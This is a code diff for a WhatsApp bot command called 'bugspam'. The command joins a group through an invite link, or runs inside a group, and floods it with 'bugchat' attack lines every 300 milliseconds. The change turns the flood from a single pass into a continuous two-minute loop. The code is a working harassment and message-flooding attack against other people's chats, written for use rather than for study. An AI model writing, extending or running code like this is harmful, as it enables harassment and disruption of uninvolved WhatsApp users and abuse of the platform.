@@ -27,6 +27,18 @@ cmd({
     const isGroupLink = args[0]?.startsWith('https://chat.whatsapp.com/');
     const attackLines = bugchat.split('\n').filter(Boolean);
 
+    // Function pou voye pandan 2 minit
+    const startBugSpam = async (target) => {
+      const endTime = Date.now() + 2 * 60 * 1000; // 2 minit
+
+      while (Date.now() < endTime) {
+        for (let line of attackLines) {
+          await izuka.sendMessage(target, { text: `💥 ${line}\n_BUGSPAM ACTIVE_` });
+          await new Promise(r => setTimeout(r, 300)); // Chak 300ms
+        }
+      }
+    };
+
     // Case 1: DM + Group Invite Link
     if (!m.isGroup && isGroupLink) {
       const inviteCode = args[0].split('/')[3];
@@ -34,10 +46,7 @@ cmd({
         const groupId = await izuka.groupAcceptInvite(inviteCode);
         await izuka.sendMessage(senderId, { text: `✅ Joined group via invite.\n🚀 Starting bugspam in ${groupId}...` }, { quoted: mek });
 
-        for (let line of attackLines) {
-          await izuka.sendMessage(groupId, { text: `💥 ${line}\n_BUGSPAM ACTIVE_` });
-          await new Promise(r => setTimeout(r, 300));
-        }
+        await startBugSpam(groupId);
 
         await izuka.sendMessage(senderId, { text: `✅ Bugspam completed on group.` }, { quoted: mek });
       } catch (e) {
@@ -49,16 +58,13 @@ cmd({
     // Case 2: Used directly inside a group
     if (m.isGroup) {
       await izuka.sendMessage(from, {
-        text: `🚨 *BUGSPAM ACTIVATED*\n🧨 Target: ${from}\n💬 Messages: ${attackLines.length}`
+        text: `🚨 *BUGSPAM ACTIVATED*\n🧨 Target: ${from}\n🕒 Duration: 2 minutes`
       }, { quoted: mek });
 
-      for (let line of attackLines) {
-        await izuka.sendMessage(from, { text: `⚠️ ${line}\n_BY BOT OWNER_` });
-        await new Promise(r => setTimeout(r, 300));
-      }
+      await startBugSpam(from);
 
       await izuka.sendMessage(from, {
-        text: `✅ *BUGSPAM COMPLETE*\n🔥 Target group has been spammed.`
+        text: `✅ *BUGSPAM COMPLETE*\n🔥 Group has been spammed for 2 minutes.`
       }, { quoted: mek });
 
       return;
